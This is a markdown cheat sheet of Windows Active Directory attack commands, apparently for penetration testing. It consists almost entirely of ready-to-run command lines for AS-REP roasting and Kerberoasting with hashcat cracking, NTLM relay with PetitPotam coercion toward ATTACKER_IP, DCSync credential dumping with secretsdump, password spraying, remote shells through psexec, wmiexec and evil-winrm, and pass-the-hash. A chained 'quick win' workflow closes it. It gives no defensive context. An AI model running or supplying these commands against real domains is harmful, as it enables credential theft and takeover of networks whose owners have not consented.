# Windows/AD Exploitation Commands

## Kerberos Attacks

### AS-REP Roasting
```bash
# No credentials needed - finds users without pre-auth
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt

# With any domain credentials
impacket-GetNPUsers DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt

# Crack the hashes
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
```

### Kerberoasting
```bash
# Requires any domain credentials
impacket-GetUserSPNs DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast.txt

# Crack service tickets
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```

## SMB Relay Attack (If Signing Disabled)

```bash
# Terminal 1: Setup relay
impacket-ntlmrelayx -t ldaps://DC_IP --escalate-user LOWPRIV_USER --delegate-access

# Terminal 2: Coerce authentication
python3 PetitPotam.py -u LOWPRIV_USER -p 'PASSWORD' ATTACKER_IP DC_IP

# After success, DCSync:
impacket-secretsdump 'DOMAIN/LOWPRIV_USER:PASSWORD@DC_IP' -just-dc
```

## Password Spraying

```bash
# ALWAYS check policy first!
netexec smb DC_IP -u USERNAME -p 'PASSWORD' --pass-pol

# Safe spraying (one password at a time)
netexec smb DC_IP -u users.txt -p 'Welcome2024!' --continue-on-success
```

## Remote Execution

```bash
# PSExec
impacket-psexec DOMAIN/USERNAME:PASSWORD@TARGET

# WMIExec (stealthier)
impacket-wmiexec DOMAIN/USERNAME:PASSWORD@TARGET

# Evil-WinRM
evil-winrm -i TARGET -u USERNAME -p 'PASSWORD'

# With NTLM hash (pass-the-hash)
impacket-psexec -hashes :NTLM_HASH Administrator@TARGET
evil-winrm -i TARGET -u Administrator -H NTLM_HASH
```

## Quick Win Workflow

```bash
# First 10 minutes with domain creds:
netexec smb DC_IP --gen-relay-list relay.txt && \
impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -o asrep.txt && \
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -o kerberoast.txt && \
bloodhound-python -u USER -p 'PASS' -d DOMAIN -ns DC_IP -c All --zip && \
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force & \
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force &
```
